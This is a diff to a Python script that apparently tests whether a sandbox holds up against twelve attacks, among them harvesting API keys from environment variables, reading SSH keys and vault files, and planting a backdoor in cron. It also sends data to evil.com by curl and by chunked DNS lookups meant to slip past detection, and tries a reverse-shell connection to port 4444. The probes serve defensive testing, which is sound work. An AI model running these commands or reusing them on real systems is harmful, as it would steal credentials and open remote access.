@@ -17,11 +17,12 @@ import sys
 from pathlib import Path
 
 results = {}
+TOTAL = 12
 
 # ==============================================================================
 # Attack 1: Environment Variable Reconnaissance
 # ==============================================================================
-print("[1/9] Scanning environment variables for secrets...")
+print(f"[1/{TOTAL}] Scanning environment variables for secrets...")
 secrets = {
     k: v
     for k, v in os.environ.items()
@@ -51,7 +52,7 @@ else:
 # ==============================================================================
 # Attack 2: Vault File Access
 # ==============================================================================
-print("[2/9] Attempting to read vault file...")
+print(f"[2/{TOTAL}] Attempting to read vault file...")
 vault_paths = [
     Path.home() / ".hermes-aegis" / "vault.enc",
     Path("/root/.hermes-aegis/vault.enc"),
@@ -77,7 +78,7 @@ if not vault_accessible:
 # ==============================================================================
 # Attack 3: HTTP Exfiltration
 # ==============================================================================
-print("[3/9] Attempting HTTP exfiltration...")
+print(f"[3/{TOTAL}] Attempting HTTP exfiltration...")
 try:
     import requests
 
@@ -94,7 +95,7 @@ except Exception as e:
 # ==============================================================================
 # Attack 4: Direct TCP Socket
 # ==============================================================================
-print("[4/9] Attempting direct TCP connection...")
+print(f"[4/{TOTAL}] Attempting direct TCP connection...")
 try:
     sock = socket.create_connection(("8.8.8.8", 53), timeout=3)
     sock.close()
@@ -105,7 +106,7 @@ except Exception as e:
 # ==============================================================================
 # Attack 5: DNS Tunneling
 # ==============================================================================
-print("[5/9] Attempting DNS tunneling...")
+print(f"[5/{TOTAL}] Attempting DNS tunneling...")
 try:
     socket.getaddrinfo("secret-data-abc123.evil.com", 80)
     results["dns_tunnel"] = {"status": "FAIL", "details": "DNS lookup succeeded"}
@@ -115,7 +116,7 @@ except Exception as e:
 # ==============================================================================
 # Attack 6: Raw Socket (requires CAP_NET_RAW)
 # ==============================================================================
-print("[6/9] Attempting raw socket creation...")
+print(f"[6/{TOTAL}] Attempting raw socket creation...")
 try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     sock.close()
@@ -126,7 +127,7 @@ except Exception as e:
 # ==============================================================================
 # Attack 7: Subprocess Exfiltration (curl)
 # ==============================================================================
-print("[7/9] Attempting subprocess exfiltration via curl...")
+print(f"[7/{TOTAL}] Attempting subprocess exfiltration via curl...")
 try:
     result = subprocess.run(
         ["curl", "-X", "POST", "http://evil.com/exfil", "-d", "stolen=data"],
@@ -143,7 +144,7 @@ except Exception as e:
 # ==============================================================================
 # Attack 8: Filesystem Write Outside Workspace
 # ==============================================================================
-print("[8/9] Attempting to write backdoor outside workspace...")
+print(f"[8/{TOTAL}] Attempting to write backdoor outside workspace...")
 privileged_paths = [
     "/usr/local/bin/backdoor",
     "/etc/cron.d/exfil",
@@ -173,7 +174,7 @@ else:
 # ==============================================================================
 # Attack 9: Host SSH Key Access
 # ==============================================================================
-print("[9/9] Attempting to read host SSH keys...")
+print(f"[9/{TOTAL}] Attempting to read host SSH keys...")
 ssh_paths = [
     Path("/root/.ssh/id_rsa"),
     Path("/root/.ssh/id_ed25519"),
@@ -199,6 +200,80 @@ if not ssh_accessible:
         "status": "PROTECTED",
         "details": "SSH keys not mounted/accessible",
     }
+
+# ==============================================================================
+# Attack 10: Supply Chain -- install malicious package
+# ==============================================================================
+TOTAL = 12
+print(f"[10/{TOTAL}] Attempting to install malicious package...")
+try:
+    result = subprocess.run(
+        ["pip", "install", "totally-legit-package-not-malware"],
+        capture_output=True,
+        timeout=10,
+    )
+    if result.returncode == 0:
+        results["supply_chain"] = {"status": "FAIL", "details": "pip install succeeded"}
+    else:
+        stderr = result.stderr.decode(errors="replace")[:200]
+        if "read-only" in stderr.lower():
+            results["supply_chain"] = {"status": "PROTECTED", "details": "Read-only filesystem blocked pip"}
+        else:
+            results["supply_chain"] = {"status": "PROTECTED", "details": f"pip failed: {stderr[:80]}"}
+except FileNotFoundError:
+    results["supply_chain"] = {"status": "PROTECTED", "details": "pip not available"}
+except Exception as e:
+    results["supply_chain"] = {"status": "PROTECTED", "details": f"Blocked: {type(e).__name__}"}
+
+# ==============================================================================
+# Attack 11: Chunked exfiltration -- split secret across small requests
+# ==============================================================================
+print(f"[11/{TOTAL}] Attempting chunked secret exfiltration...")
+fake_key = os.environ.get("OPENAI_API_KEY", "sk-proj-NOTFOUND")
+chunked_ok = False
+try:
+    # Try to send secret in 5-char chunks via DNS (below pattern detection threshold)
+    for i in range(0, min(len(fake_key), 20), 5):
+        chunk = fake_key[i:i+5]
+        socket.getaddrinfo(f"{chunk}.chunk{i}.exfil.evil.com", 80)
+    chunked_ok = True
+    results["chunked_exfil"] = {"status": "FAIL", "details": f"Sent {len(fake_key)} chars in chunks via DNS"}
+except Exception as e:
+    results["chunked_exfil"] = {"status": "PROTECTED", "details": f"Blocked: {type(e).__name__}"}
+
+# ==============================================================================
+# Attack 12: Process injection -- spawn reverse shell
+# ==============================================================================
+print(f"[12/{TOTAL}] Attempting reverse shell...")
+try:
+    # Try common reverse shell tools
+    shell_tools = ["nc", "ncat", "netcat", "bash", "python3"]
+    available = []
+    for tool in shell_tools:
+        try:
+            result = subprocess.run(
+                ["which", tool], capture_output=True, timeout=2
+            )
+            if result.returncode == 0:
+                available.append(tool)
+        except Exception:
+            pass
+
+    # Try to actually connect back (will fail on internal network)
+    if available:
+        result = subprocess.run(
+            ["python3", "-c",
+             "import socket;s=socket.socket();s.settimeout(2);s.connect(('10.0.0.1',4444))"],
+            capture_output=True, timeout=5,
+        )
+        if result.returncode == 0:
+            results["reverse_shell"] = {"status": "FAIL", "details": f"Reverse shell connected. Tools: {available}"}
+        else:
+            results["reverse_shell"] = {"status": "PROTECTED", "details": f"Connection blocked. Tools present: {available}"}
+    else:
+        results["reverse_shell"] = {"status": "PROTECTED", "details": "No shell tools available"}
+except Exception as e:
+    results["reverse_shell"] = {"status": "PROTECTED", "details": f"Blocked: {type(e).__name__}"}
 
 # ==============================================================================
 # Report Results
